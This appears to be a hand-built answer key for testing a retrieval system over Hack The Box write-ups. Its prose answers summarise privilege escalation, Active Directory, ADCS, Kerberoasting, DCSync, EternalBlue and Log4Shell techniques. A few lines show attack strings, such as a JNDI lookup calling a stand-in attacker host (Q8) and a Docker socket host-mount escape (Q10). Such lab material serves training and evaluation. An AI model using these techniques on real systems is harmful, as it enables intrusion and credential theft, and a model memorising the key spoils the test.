# HTB RAG – Answer Key

> Built manually by grepping `raw/*.md` — NOT from the RAG system.

---

## Broad Questions

---
**Q1** | Windows privilege escalation cheatsheet
Machines: htb-absolute, htb-access, htb-active, htb-acute, htb-administrator, htb-aero, htb-anubis, htb-appsanity, htb-apt, htb-arctic, htb-arkham, htb-atom, htb-authority, htb-axlle, htb-baby, htb-bankrobber, htb-bastard, htb-bastion, htb-blackfield, htb-blazorized, htb-blue, htb-bounty, htb-breach, htb-bruno, htb-cascade, htb-cereal, htb-cicada, htb-coder, htb-compiled, htb-conceal, htb-control, htb-crafty, htb-darkzero, htb-devel, htb-driver, htb-eighteen, htb-escape, htb-escapetwo, htb-ethereal, htb-fighter, htb-fluffy, htb-forest, htb-freelancer, htb-fulcrum, htb-fuse, htb-ghost, htb-giddy, htb-grandpa, htb-granny, htb-hathor, htb-haze, htb-heist, htb-helpline, htb-infiltrator, htb-jab, htb-jeeves, htb-job, htb-jobtwo, htb-lock, htb-love, htb-lustroustwo, htb-mailing, htb-manager, htb-mantis, htb-media, htb-minion, htb-mirage, htb-monitorsfour, htb-monteverde, htb-multimaster, htb-nanocorp, htb-napper, htb-object, htb-office, htb-omni, htb-optimum, htb-outdated, htb-overwatch, htb-perspective, htb-phantom, htb-pivotapi, htb-pov, htb-proper, htb-puppy, htb-querier, htb-rabbit, htb-rainbow, htb-re, htb-reaper, htb-rebound, htb-redelegate, htb-reel, htb-reel2, htb-remote, htb-resolute, htb-retrotwo, htb-return, htb-rustykey, htb-sauna, htb-scepter, htb-search, htb-sendai, htb-servmon, htb-sharp, htb-shibuya, htb-signed, htb-silo, htb-sizzle, htb-sniper, htb-solarlab, htb-streamio, htb-support, htb-tally, htb-timelapse, htb-tombwatcher, htb-toolbox, htb-university, htb-vulncicada, htb-vulnescape, htb-worker
Answer: Windows privesc techniques include token impersonation (Potato family), SeImpersonatePrivilege abuse, SAM/SYSTEM hive dumps, unquoted service paths, DLL hijacking, AlwaysInstallElevated, PrintSpoofer, NTLM relay to ADCS, WCF service injection, NSClient++ exploits, and AD-integrated DNS abuse.

---

---
**Q2** | Linux privilege escalation cheatsheet
Machines: htb-abducted, htb-academy, htb-admirer, htb-admirertoo, htb-agile, htb-ai, htb-airtouch, htb-alert, htb-altered, htb-ambassador, htb-analytics, htb-apocalyst, htb-ariekei, htb-artificial, htb-awkward, htb-backdoor, htb-backend, htb-backendtwo, htb-backfire, htb-bamboo, htb-barrier, htb-bashed, htb-bigbang, htb-bitlab, htb-bizness, htb-blurry, htb-boardlight, htb-bolt, htb-book, htb-bookworm, htb-bountyhunter, htb-brainfuck, htb-broker, htb-browsed, htb-build, htb-busqueda, htb-cache, htb-calamity, htb-canape, htb-caption, htb-carpediem, htb-carrier, htb-catch, htb-celestial, htb-chaos, htb-charon, htb-checker, htb-chemistry, htb-clicker, htb-code, htb-codetwo, htb-codify, htb-conversor, htb-corporate, htb-cozyhosting, htb-craft, htb-cronos, htb-crossfit, htb-curling, htb-cybermonday, htb-cypher, htb-darkcorp, htb-data, htb-derailed, htb-developer, htb-devoops, htb-devvortex, htb-devzat, htb-doctor, htb-dog, htb-down, htb-download, htb-drive, htb-dump, htb-dynstr, htb-earlyaccess, htb-editor, htb-editorial, htb-ellingson, htb-encoding, htb-enterprise, htb-environment, htb-epsilon, htb-eureka, htb-europa, htb-expressway, htb-extension, htb-facts, htb-faculty, htb-falafel, htb-fatty, htb-feline, htb-fingerprint, htb-flustered, htb-forge, htb-forgot, htb-forgotten, htb-formulax, htb-forwardslash, htb-frolic, htb-fulcrum, htb-gavel, htb-giveback, htb-gobox, htb-gofer, htb-guardian, htb-hacknet, htb-haircut, htb-headless, htb-health, htb-holiday, htb-horizontall, htb-iclean, htb-imagery, htb-inject, htb-interface, htb-interpreter, htb-intuition, htb-investigation, htb-irked, htb-jarmis, htb-jarvis, htb-jewel, htb-joker, htb-jupiter, htb-keeper, htb-knife, htb-kotarak, htb-laboratory, htb-lacasadepapel, htb-lantern, htb-laser, htb-late, htb-lazy, htb-lightweight, htb-linkvortex, htb-logforge, htb-magic, htb-magicgardens, htb-mailroom, htb-manage, htb-mango, htb-mentor, htb-meta, htb-metatwo, htb-mirai, htb-mischief, htb-monitored, htb-monitors, htb-monitorsthree, htb-monitorstwo, htb-nineveh, htb-nocturnal, htb-node, htb-nodeblog, htb-nunchucks, htb-obscurity, htb-onlyforyou, htb-oouch, htb-openadmin, htb-opensource, htb-ophiuchi, htb-ouija, htb-outbound, htb-overgraph, htb-patents, htb-pc, htb-perfection, htb-photobomb, htb-pikatwoo, htb-pilgrimage, htb-planning, htb-playertwo, htb-popcorn, htb-precious, htb-previous, htb-previse, htb-principal, htb-quick, htb-race, htb-rainyday, htb-ready, htb-redcross, htb-redpanda, htb-registrytwo, htb-reset, htb-response, htb-retired, htb-rope, htb-ropetwo, htb-routerspace, htb-runner, htb-sandworm, htb-sau, htb-scanned, htb-scriptkiddie, htb-seal, htb-secret, htb-sekhmet, htb-seventeen, htb-shared, htb-shocker, htb-shoppy, htb-sightless, htb-sink, htb-skyfall, htb-slonik, htb-smasher, htb-smasher2, htb-snapped, htb-sneaky, htb-sneakymailer, htb-snoopy, htb-socket, htb-solidstate, htb-sorcery, htb-spooktrol, htb-stacked, htb-static, htb-stocker, htb-store, htb-surveillance, htb-tabby, htb-tartarsauce, htb-teacher, htb-ten, htb-tenet, htb-tentacle, htb-tenten, htb-time, htb-timing, htb-titanic, htb-toby, htb-topology, htb-traceback, htb-traverxec, htb-trick, htb-trickster, htb-twomillion, htb-unbalanced, htb-underpass, htb-unicode, htb-union, htb-unobtainium, htb-unrested, htb-updown, htb-valentine, htb-variatype, htb-vault, htb-vessel, htb-waldo, htb-wall, htb-whiterabbit, htb-wifinetictwo, htb-wingdata, htb-writer, htb-writeup, htb-yummy, htb-zero, htb-zetta, htb-zipper
Answer: Linux privesc techniques include sudo misconfiguration, SUID binary abuse, cron job hijacking, kernel exploits (DirtyCow CVE-2016-5195), capability abuse, NFS misconfiguration, writable /etc/passwd, PATH hijacking, Docker/LXD group escape, PAM cache symlink attacks, and snapd vulnerabilities.

---

---
**Q3** | Active Directory attack techniques cheatsheet
Machines: htb-absolute, htb-active, htb-administrator, htb-anubis, htb-apt, htb-authority, htb-axlle, htb-babytwo, htb-blackfield, htb-blazorized, htb-breach, htb-bruno, htb-cascade, htb-certified, htb-coder, htb-darkcorp, htb-darkzero, htb-delegate, htb-eighteen, htb-escape, htb-escapetwo, htb-fluffy, htb-forest, htb-freelancer, htb-ghost, htb-hathor, htb-haze, htb-infiltrator, htb-intelligence, htb-jab, htb-lustroustwo, htb-manager, htb-mantis, htb-mirage, htb-mist, htb-multimaster, htb-nanocorp, htb-object, htb-office, htb-outdated, htb-phantom, htb-pivotapi, htb-puppy, htb-rebound, htb-redelegate, htb-reel, htb-retro, htb-retrotwo, htb-rustykey, htb-sauna, htb-scepter, htb-search, htb-sendai, htb-shibuya, htb-signed, htb-sizzle, htb-streamio, htb-support, htb-tombwatcher, htb-university, htb-vintage, htb-voleur, htb-vulncicada
Answer: AD techniques include AS-REP Roasting, Kerberoasting, DCSync, BloodHound enumeration, NTLM relay, constrained/unconstrained delegation abuse, RBCD, Shadow Credentials, ACL abuse (GenericAll, WriteDACL, WriteOwner), Golden/Silver ticket, Pass-the-Hash, GMSA password extraction, and ADCS certificate abuse (ESC1-ESC9).

---

---
**Q4** | ADCS certificate abuse techniques
Machines: htb-absolute, htb-anubis, htb-authority, htb-certified, htb-coder, htb-darkcorp, htb-darkzero, htb-escape, htb-escapetwo, htb-fluffy, htb-haze, htb-infiltrator, htb-manager, htb-mirage, htb-mist, htb-rebound, htb-retro, htb-scepter, htb-sendai, htb-shibuya, htb-tombwatcher, htb-vulncicada
Answer: ADCS abuse techniques include ESC1 (misconfigured certificate templates), ESC4 (template ACL abuse), ESC7 (CA officer approval bypass), ESC8 (NTLM relay to HTTP enrollment), ESC9 (GenericWrite on certificate template), Shadow Credentials via certipy, and certificate-based authentication for privilege escalation.

---

---
**Q5** | Password cracking and hash dumping techniques
Machines: htb-absolute, htb-access, htb-active, htb-acute, htb-administrator, htb-airtouch, htb-alert, htb-antique, htb-anubis, htb-apt, htb-aragog, htb-arctic, htb-ariekei, htb-arkham, htb-armageddon, htb-artificial, htb-attended, htb-authority, htb-awkward, htb-axlle, htb-baby, htb-bamboo, htb-bankrobber, htb-bastard, htb-bastion, htb-bigbang, htb-bighead, htb-bizness, htb-blackfield, htb-blazorized, htb-blunder, htb-bolt, htb-brainfuck, htb-breach, htb-browsed, htb-bruno, htb-build, htb-builder, htb-cache, htb-carpediem, htb-cascade, htb-cat, htb-catch, htb-cerberus, htb-certified, htb-chainsaw, htb-charon, htb-checker, htb-chemistry, htb-cicada, htb-code, htb-coder, htb-codetwo, htb-codify, htb-compiled, htb-control, htb-conversor, htb-cozyhosting, htb-craft, htb-crimestoppers, htb-crossfit, htb-crossfittwo, htb-cybermonday, htb-cypher, htb-dab, htb-darkcorp, htb-darkzero, htb-data, htb-delegate, htb-delivery, htb-derailed, htb-devarea, htb-developer, htb-devvortex, htb-download, htb-drive, htb-driver, htb-earlyaccess, htb-eighteen, htb-ellingson, htb-environment, htb-era, htb-escape, htb-escapetwo, htb-ethereal, htb-europa, htb-expressway, htb-extension, htb-facts, htb-falafel, htb-fingerprint, htb-fluffy, htb-flujab, htb-forest, htb-formulax, htb-freelancer, htb-frolic, htb-fuse, htb-gavel, htb-ghost, htb-giddy, htb-giveback, htb-gofer, htb-goodgames, htb-guardian, htb-hacknet, htb-hathor, htb-hawk, htb-haze, htb-health, htb-heist, htb-helpline, htb-iclean, htb-imagery, htb-infiltrator, htb-instant, htb-intelligence, htb-intense, htb-interpreter, htb-intuition, htb-jab, htb-jail, htb-jeeves, htb-jewel, htb-job, htb-jobtwo, htb-joker, htb-json, htb-kotarak, htb-lightweight, htb-luanne, htb-lustroustwo, htb-magicgardens, htb-mailing, htb-manager, htb-mantis, htb-media, htb-mentor, htb-metatwo, htb-minion, htb-mirage, htb-mist, htb-monitored, htb-monitorsfour, htb-monitorsthree, htb-monitorstwo, htb-monteverde, htb-multimaster, htb-nanocorp, htb-nocturnal, htb-node, htb-object, htb-obscurity, htb-office, htb-omni, htb-openadmin, htb-outdated, htb-overflow, htb-overwatch, htb-oz, htb-perfection, htb-perspective, htb-phantom, htb-pikaboo, htb-pivotapi, htb-pollution, htb-postman, htb-pov, htb-previse, htb-proper, htb-puppy, htb-querier, htb-quick, htb-rabbit, htb-race, htb-rainyday, htb-re, htb-rebound, htb-redcross, htb-redelegate, htb-reel, htb-reel2, htb-remote, htb-resolute, htb-response, htb-retro, htb-retrotwo, htb-return, htb-runner, htb-rustykey, htb-safe, htb-sauna, htb-scanned, htb-scepter, htb-schooled, htb-scrambled, htb-search, htb-sekhmet, htb-sendai, htb-servmon, htb-seventeen, htb-shared, htb-shibboleth, htb-shibuya, htb-shoppy, htb-shrek, htb-sightless, htb-signed, htb-silo, htb-sizzle, htb-slonik, htb-smasher, htb-snapped, htb-sneakymailer, htb-snoopy, htb-sorcery, htb-stratosphere, htb-streamio, htb-sunday, htb-support, htb-surveillance, htb-tabby, htb-talkative, htb-tally, htb-tentacle, htb-tenten, htb-timelapse, htb-timing, htb-titanic, htb-toby, htb-tombwatcher, htb-toolbox, htb-topology, htb-traverxec, htb-trickster, htb-unbalanced, htb-undetected, htb-university, htb-vessel, htb-vintage, htb-voleur, htb-vulncicada, htb-watcher, htb-whiterabbit, htb-wingdata, htb-worker, htb-writer
Answer: Techniques include secretsdump.py (SAM/NTDS.dit extraction), hashcat/john for cracking NTLM/NTHash/bcrypt/MD5, mimikatz for in-memory credential harvesting, AS-REP hash cracking, Kerberoast hash cracking, credential extraction from config files/databases, and DCSync for domain hash dumping.

---

## Specific Questions

---
**Q6** | Kerberoasting in Active Directory
Machines: htb-absolute, htb-active, htb-administrator, htb-blackfield, htb-blazorized, htb-breach, htb-certified, htb-delegate, htb-escape, htb-fluffy, htb-forest, htb-hathor, htb-intelligence, htb-jab, htb-lustroustwo, htb-mirage, htb-object, htb-pivotapi, htb-puppy, htb-rebound, htb-sauna, htb-scrambled, htb-search, htb-sizzle, htb-tombwatcher, htb-vintage, htb-voleur
Answer: Kerberoasting targets Active Directory service accounts configured with Service Principal Names (SPNs). An authenticated domain user requests a Kerberos TGS ticket for the target SPN from the Domain Controller. The ticket is encrypted with the service account's NTLM password hash. The attacker extracts the ticket offline and cracks the password hash using hashcat (mode 13100) or john. Common tools include GetUserSPNs.py (Impacket), Rubeus, and Invoke-Kerberoast.

---

---
**Q7** | MS17-010 EternalBlue exploitation
Machines: htb-blue, htb-legacy
Answer: MS17-010 (CVE-2017-0143 / EternalBlue) is a critical remote code execution vulnerability in the SMBv1 protocol in Windows. It allows unauthenticated attackers to execute arbitrary shellcode in kernel space over SMB port 445, granting immediate NT AUTHORITY\SYSTEM access. Common tools and exploit modules include Metasploit (exploit/windows/smb/ms17_010_eternalblue) and standalone Python exploits (e.g. zzz_exploit.py / checker.py). Demonstrated on Blue and Legacy.

---

---
**Q8** | CVE-2021-44228 Log4Shell RCE
Machines: htb-crafty, htb-logforge
Answer: CVE-2021-44228 (Log4Shell) is an unauthenticated Remote Code Execution flaw in the Apache Log4j library resulting from improper validation of JNDI lookups (e.g. ${jndi:ldap://attacker:1389/Exploit}). Attackers trigger the lookup by injecting malicious strings into HTTP headers, chat messages, or input fields. A rogue LDAP or RMI referral server (such as marshalsec or JNDIExploit) serves a payload class which the vulnerable host deserializes and executes. Demonstrated on Crafty and Logforge.

---

---
**Q9** | SQL injection with sqlmap
Machines: htb-cache, htb-catch, htb-enterprise, htb-europa, htb-faculty, htb-falafel, htb-giddy, htb-health, htb-jarvis, htb-metatwo, htb-nodeblog, htb-proper, htb-shared, htb-streamio, htb-trick
Answer: sqlmap is an automated tool used to detect and exploit SQL injection vulnerabilities in web applications. On HTB machines, it is leveraged to enumerate databases (--dbs), dump sensitive tables and user credential hashes (--dump), test stacked queries or time-based blind SQLi, read arbitrary files (--file-read), or achieve remote OS command execution (--os-shell). Demonstrated on Jarvis, Europa, Falafel, Cache, Shared, and Faculty.

---

---
**Q10** | Docker container breakout
Machines: htb-carpediem, htb-corporate, htb-data, htb-extension, htb-feline, htb-intuition, htb-laboratory, htb-magicgardens, htb-monitors, htb-monitorstwo, htb-pikatwoo, htb-runner, htb-sorcery, htb-stacked, htb-talkative
Answer: Docker breakout techniques on HTB include: 1) Abusing exposed or mounted Docker sockets (/var/run/docker.sock) to spawn a new privileged container mounting the host's root directory (docker run -v /:/host -it alpine chroot /host); 2) Exploiting containers run with --privileged by mounting host disk devices or using cgroups release_agent execution (CVE-2022-0492 on Carpediem); 3) Exploiting container runtime vulnerabilities like runc (CVE-2024-21626 on Runner, cr8escape on Pikatwoo); and 4) Abusing membership in the local docker group on the host.

---

---
**Q11** | Token impersonation via JuicyPotato / PrintSpoofer
Machines: htb-bruno, htb-cereal, htb-conceal, htb-fighter, htb-json, htb-mirage, htb-perspective, htb-pivotapi, htb-rebound, htb-scrambled, htb-shibuya, htb-tally, htb-worker
Answer: Windows service accounts (such as IIS APPPOOL or LOCAL SERVICE) often possess SeImpersonatePrivilege. Attackers abuse this by tricking a high-privileged account (such as NT AUTHORITY\SYSTEM) into authenticating to a local rogue RPC/COM server. JuicyPotato coerces authentication via DCOM using specific CLSIDs, while PrintSpoofer coerces authentication via the named pipe of the Print Spooler service (\\.\pipe\spoolss). Once the SYSTEM token is captured, the exploit calls CreateProcessWithTokenW to spawn a shell with elevated SYSTEM privileges.

---

---
**Q12** | DCSync attack
Machines: htb-administrator, htb-blazorized, htb-darkcorp, htb-delegate, htb-forest, htb-ghost, htb-hathor, htb-mirage, htb-mist, htb-phantom, htb-retrotwo, htb-rustykey, htb-sauna, htb-scepter, htb-signed, htb-sizzle, htb-university, htb-vintage
Answer: DCSync mimics the behavior of an Active Directory Domain Controller using the Directory Replication Service (DRS) Remote Protocol (MS-DRSR). By requesting replication of user objects via GetNCChanges, an attacker with replication permissions (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All) can dump the password hashes of any domain account—including the krbtgt account and Domain Admins—from NTDS.dit without running code on the DC itself. Executed using Impacket's secretsdump.py -just-dc or Mimikatz lsadump::dcsync.

---

---
**Q13** | SUID binaries and GTFOBins Linux privesc
Machines: htb-academy, htb-awkward, htb-chaos, htb-conversor, htb-cozyhosting, htb-devvortex, htb-dump, htb-earlyaccess, htb-facts, htb-flujab, htb-jail, htb-jarvis, htb-jewel, htb-joker, htb-knife, htb-luanne, htb-mango, htb-meta, htb-monitorstwo, htb-nunchucks, htb-openadmin, htb-paper, htb-schooled, htb-shoppy, htb-sunday, htb-traverxec, htb-unrested, htb-updown, htb-writer, htb-zero
Answer: SUID (Set Owner User ID up on execution) binaries run with the permissions of the file owner (typically root). Attackers enumerate them via find / -perm -4000 -type f 2>/dev/null. If a binary is misconfigured, vulnerable, or listed on GTFOBins (such as bash, nmap, vim, python, find, cp, systemctl, or custom SUID binaries), attackers exploit built-in functionality (e.g. shell escapes, arbitrary file read/write, shared library loading) to escalate privileges to root.

---

---
**Q14** | WinRM / evil-winrm shell access
Machines: htb-absolute, htb-administrator, htb-anubis, htb-apt, htb-arkham, htb-atom, htb-authority, htb-axlle, htb-baby, htb-babytwo, htb-blackfield, htb-blazorized, htb-cascade, htb-cerberus, htb-certified, htb-cicada, htb-coder, htb-compiled, htb-darkcorp, htb-darkzero, htb-delegate, htb-driver, htb-eighteen, htb-escape, htb-escapetwo, htb-fluffy, htb-forest, htb-freelancer, htb-fuse, htb-ghost, htb-hancliffe, htb-hathor, htb-haze, htb-heist, htb-infiltrator, htb-jab, htb-jobtwo, htb-mailing, htb-manager, htb-mirage, htb-mist, htb-monteverde, htb-multimaster, htb-nanocorp, htb-object, htb-office, htb-outdated, htb-overwatch, htb-phantom, htb-pivotapi, htb-puppy, htb-re, htb-rebound, htb-redelegate, htb-reel2, htb-remote, htb-resolute, htb-retro, htb-return, htb-rustykey, htb-sauna, htb-scepter, htb-sekhmet, htb-sendai, htb-shibuya, htb-signed, htb-streamio, htb-support, htb-timelapse, htb-tombwatcher, htb-university, htb-vintage, htb-voleur, htb-worker
Answer: Evil-WinRM is used for remote PowerShell shell access over WinRM (port 5985/5986). Used with plaintext passwords, NTLM hashes (pass-the-hash), or certificates. Requires target user to be in Remote Management Users group. Common contexts: post-exploitation lateral movement, using recovered credentials, or after ADCS certificate abuse.

---

---
**Q15** | Samba RCE
Machines: htb-abducted, htb-bamboo, htb-brainfuck, htb-calamity, htb-falafel, htb-frolic, htb-gofer, htb-jail, htb-kotarak, htb-lame, htb-lazy, htb-node, htb-overgraph, htb-puppy, htb-ropetwo, htb-sekhmet, htb-smasher2, htb-sneaky, htb-sniper, htb-tenten, htb-traceback, htb-writer, htb-ypuffy, htb-zetta, htb-zipper
Answer: Samba RCE exploits include CVE-2007-2447 (Samba 3.0.20 username map script command injection, exploited on Lame via Metasploit), CVE-2017-7494 (SambaCry - writable share to load malicious shared library), and misconfigured SMB shares allowing credential theft or file upload for code execution.

---

